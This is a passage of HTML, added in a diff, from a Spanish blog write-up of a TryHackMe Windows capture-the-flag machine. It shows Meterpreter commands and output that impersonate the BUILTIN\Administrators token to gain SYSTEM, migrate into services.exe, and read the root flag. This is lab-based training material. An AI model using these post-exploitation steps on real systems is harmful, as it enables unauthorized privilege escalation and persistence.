+</span></span><span style="display:flex;"><span><span style="color:#f92672">========================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>BUILTIN<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\A</span>udioEndpointBuilder
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\C</span>ertPropSvc
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\C</span>scService
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\i</span>phlpsvc
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\L</span>anmanServer
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\P</span>caSvc
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\S</span>chedule
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\S</span>ENS
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\S</span>essionEnv
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\T</span>rkWks
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\U</span>mRdpService
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\U</span>xSms
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\W</span>inmgmt
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\w</span>uauserv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impersonation Tokens Available
+</span></span><span style="display:flex;"><span><span style="color:#f92672">========================================</span>
+</span></span><span style="display:flex;"><span>No tokens available
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; impersonate_token <span style="color:#e6db74">&#34;BUILTIN\Administrators&#34;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span><span style="display:flex;"><span>             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Delegation token available
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully impersonated user NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid 
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><ul>
+<li>Migración del servicio:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Process List
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> PID   PPID  Name                  Arch  Session  User                          Path
+</span></span><span style="display:flex;"><span> ---   ----  ----                  ----  -------  ----                          ----
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">396</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">528</span>   <span style="color:#ae81ff">520</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">576</span>   <span style="color:#ae81ff">520</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">584</span>   <span style="color:#ae81ff">568</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">612</span>   <span style="color:#ae81ff">568</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">672</span>   <span style="color:#ae81ff">576</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; migrate <span style="color:#ae81ff">672</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2492</span> to 672...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.|
+</span></span></code></pre></div><ul>
+<li>Bandera root:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f root.txt
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> result...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path                                 Size <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>  Modified <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>----                                 ------------  --------------
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\r</span>oot.txt  <span style="color:#ae81ff">70</span>            2019-10-26 13:36:00 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\r</span>oot.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cd c:<span style="color:#ae81ff">\\</span>Windows<span style="color:#ae81ff">\\</span>System32<span style="color:#ae81ff">\\</span>config
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat root.txt 
+</span></span><span style="display:flex;"><span>dff0f748678f280250f25a45b8046b4a
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Aunque estamos ya en el bloque de “Advanced Exploitation”, esta máquina me ha parecido bastante sencilla. En la anterior, “Steel Mountain”, tuve más dificultades con algunas tareas. Los pasos no los he seguido al pie de la letra y he ido probando según veía lo que me parecía mejor, pero el resultado es el mismo que con los pasos propuestos. Igualmente he probado con las instrucciones propuestas, para poder probar distintos métodos de acceso y poder tener una visión más amplia de las diferentes formas de abordar una máquina como esta.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/access-tokens">#Access tokens</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#Easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/jenkins">#Jenkins</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#Meterpreter</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#Windows</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
